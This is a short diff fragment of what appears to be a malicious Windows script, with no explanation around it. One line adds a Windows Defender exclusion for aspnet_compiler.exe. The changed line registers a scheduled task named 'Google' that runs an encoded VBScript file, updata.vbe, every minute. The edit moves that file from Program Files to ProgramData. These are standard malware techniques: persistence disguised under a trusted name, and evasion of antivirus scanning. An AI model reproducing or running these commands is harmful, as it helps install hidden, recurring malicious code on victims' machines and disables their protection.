@@ -28,4 +28,4 @@ Add-MpPreference -ExclusionProcess aspnet_compiler.exe
 	
 }
 
-schtasks.exe /create /tn Google /sc minute  /st 00:10 /tr C:\Program Files\updata.vbe
+schtasks.exe /create /tn Google /sc minute  /st 00:10 /tr  C:\ProgramData\updata.vbe
